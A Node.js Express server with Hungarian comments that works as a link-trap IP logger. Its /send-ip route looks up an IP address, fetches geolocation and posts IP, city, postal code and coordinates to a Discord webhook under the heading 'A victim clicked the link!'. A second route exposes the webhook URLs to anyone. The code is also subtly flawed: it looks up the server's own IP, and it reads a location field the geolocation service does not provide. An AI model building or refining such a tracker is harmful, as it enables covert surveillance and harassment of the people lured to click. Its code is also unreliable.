const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok kiszolgálása (CSS, JS, stb.)
app.use(express.static(path.join(__dirname, 'public')));

// Webhook URL és IPAPI token a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
const ipapiToken = process.env.IPAPI_TOKEN; // Ha szükséges az API token, akkor a .env fájlban legyen

// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
});

// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
app.get('/get-webhook-url', (req, res) => {
    res.json({ webhookUrl, altWebhookUrl });
});

// /send-ip útvonal
app.get('/send-ip', async (req, res) => {
    try {
        // Első lépés: IP cím lekérése az ipify API-val
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipadd = ipData.ip; // A felhasználó IP címe

        // Második lépés: Geolokációs adat lekérése az ipapi.co API-val
        const geoResponse = await fetch(`https://ipapi.co/${ipadd}/json/?access_key=${ipapiToken}`);
        const geoData = await geoResponse.json();

        // Az API válaszból kiolvassuk a szükséges adatokat
        const [latitude, longitude] = (geoData.loc || '0,0').split(',');

        // A webhook üzenet elkészítése
        const message = {
            username: "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: `<@1095731086513930260>`,
            embeds: [{
                title: "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${ipadd}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                color: 0x800080
            }]
        };

        // Webhook küldés az alapértelmezett URL-re
        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
        res.json({ ip: ipadd }); // Visszaadja az IP-t JSON formátumban
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
